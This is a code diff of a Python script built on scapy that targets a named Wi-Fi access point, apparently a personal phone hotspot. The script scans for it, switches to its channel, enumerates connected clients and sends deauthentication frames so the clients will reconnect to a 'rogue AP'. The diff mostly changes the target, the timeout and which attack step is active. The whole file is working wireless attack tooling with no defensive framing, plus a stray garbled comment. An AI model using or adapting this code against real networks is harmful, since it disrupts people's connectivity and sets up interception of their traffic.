@@ -13,41 +13,45 @@
 # Let clients connect to our rogue AP
 
 from scanner import Scanner
-from deathenticate import deauth
-from scapy.all import Dot11Elt, Dot11, sniff
+from deauth import deauth
+from scapy.all import Dot11, sniff
+from get_clients_on_ap import get_clients_on_ap
 
 INTERFACE = "wlan0"
-TIMEOUT = 5
+TIMEOUT = 30
 
-AP_TO_ATTACK = "Sams 9"
+AP_TO_ATTACK = "Nicklas - iPhone"
 
 with Scanner(INTERFACE) as scanner:
     AP_info = scanner.get_ap(timeout=TIMEOUT, specific_ap=AP_TO_ATTACK)
+    # AP_info = scanner.get_ap(timeout=TIMEOUT)
     print(AP_info)
     print(scanner.wifis)
     channel = AP_info.Channel[0]
     BSSID = AP_info.index[0]
 
-    # change channel to be on APs channel
+    # change channel to be on APs channelwifi: Wifi
     scanner.set_channel(channel)
     print(f"Channel is: {scanner.curr_channel}")
     # Deauth clients
 
     def check_deauth(pkt):
         print("Recived package")
-        elt = pkt[Dot11Elt]
-        while elt and elt.ID != 0:
-            elt = elt.payload[Dot11Elt]
-        print(elt.info)
+        # elt = pkt[Dot11Elt]
+        # while elt and elt.ID != 0:
+        #    elt = elt.payload[Dot11Elt]
+        # print(elt.info)
         # if pkt[Dot11].addr1 == BSSID:
         deauth(INTERFACE, BSSID, pkt[Dot11].addr2, 6)
 
-    sniff(iface=INTERFACE, prn=check_deauth, filter="type mgt")  # subtype assoc-req")  # start sniffin
+    client_list = get_clients_on_ap(TIMEOUT, INTERFACE, BSSID)
+    print(client_list)
+
+    # sniff(iface=INTERFACE, prn=check_deauth, filter="type mgt")  # subtype assoc-req")  # start sniffin
 
 
 # channel = AP_info.Channel[0]
 # BSSID = AP_info.index[0]
-
 # print(AP_info.Channel)
 # print(BSSID[0])
 # os.system(f"iwconfig {INTERFACE} channel {channel}")
